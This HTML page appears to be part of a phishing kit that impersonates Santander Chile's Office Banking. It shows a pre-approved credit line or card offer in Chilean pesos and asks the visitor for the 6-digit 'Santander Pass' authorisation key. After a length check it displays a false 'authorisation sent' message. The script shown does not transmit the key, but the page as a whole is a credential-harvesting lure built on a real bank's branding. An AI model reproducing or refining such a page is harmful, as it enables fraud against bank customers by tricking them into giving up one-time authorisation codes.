<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Autorización</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <style>
    .monto-box {
      background-color: #4CAF50; /* verde */
      color: #fff;               /* letras blancas */
      padding: 8px 12px;
      border-radius: 6px;
      font-size: 15px;
      font-weight: bold;
      display: inline-block;
      margin-left: 8px;
    }
    .sub-text {
      margin-top: 10px;
      font-size: 13px;
      color: #333;
      text-align: center;
    }
    .seleccion-texto {
      text-align: center;
      margin: 15px 0;
      font-size: 15px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <div class="sub-text">Estás solicitando el siguiente producto:</div>

    <h1>Autorización requerida</h1>

    <!-- Texto normal + monto en cuadro verde -->
    <div class="seleccion-texto" id="seleccionProducto"></div>

    <label for="clave">Clave única de 6 dígitos con su App Santander Pass</label>
    <input type="password" id="clave" maxlength="6" placeholder="******">

    <button class="btn-santander" id="autorizarBtn">
      AUTORIZAR<span class="bg-arrow"></span>
    </button>

    <div id="mensaje"></div>
  </div>

  <script>
    // Función para formatear en pesos chilenos sin decimales
    function formatoCLP(valor){
      return new Intl.NumberFormat("es-CL", {
        style: "currency",
        currency: "CLP",
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
      }).format(valor);
    }

    document.addEventListener("DOMContentLoaded", () => {
      const producto1 = localStorage.getItem("producto1") || "Línea de Crédito";
      const monto1 = localStorage.getItem("lineaMonto") || 5000000;
      const producto2 = localStorage.getItem("producto2") || "Tarjeta de Crédito WorldMember Limited Business";
      const monto2 = localStorage.getItem("tarjetaMonto") || monto1;

      const seleccion = localStorage.getItem("seleccionProducto");

      let texto = "";
      if(seleccion === "linea"){
        texto = producto1 + " por <span class='monto-box'>" + formatoCLP(monto1) + "</span>";
      } else if(seleccion === "tarjeta"){
        texto = producto2 + " por <span class='monto-box'>" + formatoCLP(monto2) + "</span>";
      } else {
        texto = "No se ha seleccionado producto.";
      }

      document.getElementById("seleccionProducto").innerHTML = texto;
    });

    document.getElementById("autorizarBtn").addEventListener("click", function(){
      const clave = document.getElementById("clave").value;
      if(clave.length !== 6){
        document.getElementById("mensaje").innerText = "⚠️ La clave debe tener 6 dígitos.";
        return;
      }
      document.getElementById("mensaje").innerText = "✅ Autorización enviada correctamente.";
    });
  </script>
</body>
</html>
